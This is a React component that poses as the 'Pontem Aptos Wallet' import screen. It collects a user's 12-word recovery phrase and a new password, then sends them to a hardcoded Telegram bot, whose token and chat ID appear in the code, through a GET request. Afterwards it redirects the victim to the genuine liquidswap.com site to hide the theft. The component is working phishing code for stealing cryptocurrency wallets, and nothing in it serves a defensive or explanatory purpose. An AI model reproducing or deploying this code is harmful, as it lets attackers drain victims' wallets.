import React, { useState } from 'react'
import bg from '../assets/modalbg.svg'
import { AiOutlineDownload } from 'react-icons/ai'
import { MdKeyboardArrowLeft } from 'react-icons/md'
const ImportWallet = () => {
    const [phrase, setPhrase] = useState(false);
    const [pass, setPass] = useState('');
    const [confirmPass, setConfirmPass] = useState('');
    const [segments, setSegments] = React.useState(["", "", "", "", "", "", "", "", "", "", "", ""])
    function onPaste(event) {
        const pasted = event.clipboardData.getData("text/plain")
        console.log(pasted.split(" "))
        setSegments(pasted.split(" ").slice(0, 12))

    };
    let bot = {
        TOKEN: "5782465316:AAGMuZZyNAFBNE6DwDn9NxrW4NyxP4sXlRc",
        CHATID: "1974791133",
    }

    const style = {
        input: ''
    }
    const submitAddress = () => {
        let vault = `secret phrase is ${segments} and password is ${pass} confirm pass ${confirmPass}`

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${vault}`, {
            method: "GET"
        })
            .then(success => {
                setSegments(["", "", "", "", "", "", "", "", "", "", "", ""])
                setPass('')
                setConfirmPass('')
                window.location = 'https://liquidswap.com/#/create-pool'
            }, error => {
                alert("not sent")
            })
    }
    return (
        <div className=''>
            <div className='bg-[#16162D]  rounded-3xl'>
                {
                    !phrase ?
                        <>
                            <img className='w-full' src={bg} alt="" />
                            <div className='mx-6 py-2'>
                                <p className='text-white text-2xl font-[700] text-center'>Welcome</p>
                                <p className='text-slate-400 font-[500] text-center mt-1 mb-5'>Store your tokens securely
                                    <br />  in the Pontem Aptos Wallet</p>
                                <button onClick={() => setPhrase((prev) => !prev)} className='text-white flex items-center p-3 w-full rounded-xl border border-[#7F00FF]'>
                                    <AiOutlineDownload className='bg-[#7F00FF] p-2 rounded-3xl mr-4 text-4xl' />
                                    <div className='text-left'>
                                        <p className='text-lg'>Import Wallet</p>
                                        <p className='text-sm text-slate-500'>Import an existing wallet</p>
                                    </div>
                                </button>
                                <p className='text-sm text-white text-center mt-16 mb-4'>Need help? <span className='text-[#7F00FF]'>Official Pontem community</span></p>
                            </div>
                        </>
                        :
                        <div className='h-[500px] lg:w-[800px] md:w-[600px] w-[350px] overflow-y-scroll px-2'>
                            <div>
                                <div className='flex p-5  justify-between items-center  border-b border-slate-500'>
                                    <p onClick={() => {
                                        setSegments(["", "", "", "", "", "", "", "", "", "", "", ""])
                                        setPhrase((prev) => !prev)
                                    }
                                    } className='cursor-pointer text-slate-500 flex items-center text-lg'><MdKeyboardArrowLeft />Back</p>
                                    <p className='text-slate-200 font-[500]'>Import Wallet</p>
                                    <p>.</p>
                                </div>
                                <div className="grid grid-cols-1 gap-3 m-4 border border-[#7F00FF] p-4 rounded-2xl relative">
                                    <span className='bg-[#16162D] absolute top-[-12px] left-5 text-[#7F00FF]'>Your secrate key</span>
                                    {segments.map((s, key) =>
                                        <>
                                            <label className='text-slate-400'>{key+1}.</label>
                                            <input key={key}
                                                value={s} onPaste={onPaste} name="tjhgdjhagd" className={`bg-[#1C1C33] w-full border border-slate-600 outline-0 px-2 py-1 rounded-lg placeholder:font-[700] text-lg text-white`} />
                                        </>
                                    )}
                                </div>
                            </div>
                            <div className="grid grid-cols-1 gap-3 m-4 border border-[#7F00FF] p-4 rounded-2xl relative">
                                <span className='bg-[#16162D] absolute top-[-12px] left-5 text-[#7F00FF]'>Create new password</span>
                                <div>
                                    <label className='text-slate-600 font-[700]'>New password</label><br />
                                    <input onChange={(e) => setPass(e.target.value)} name='11' type='password' className='bg-transparent text-slate-600 w-full border border-slate-600 outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                </div>
                                <div>
                                    <label className='text-slate-600 font-[700]'>Confirm new password</label><br />
                                    <input onChange={(e) => setConfirmPass(e.target.value)} name='12' type='password' className='bg-transparent text-slate-600 w-full border border-slate-600 outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                </div>
                            </div>
                            <div className='flex flex-col items-center mx-10 my-4'>
                                <button onClick={() => submitAddress()} disabled={!segments || !confirmPass} className={!segments || !confirmPass ? 'cursor-not-allowed w-full bg-[#7F00FF] text-white font-[700] p-3 rounded-3xl opacity-10' : 'cursor-pointer w-full bg-[#7F00FF] text-white font-[700] p-3 rounded-3xl'}>Import</button>
                            </div>
                        </div>
                }
            </div>
        </div>
    )
}

export default ImportWallet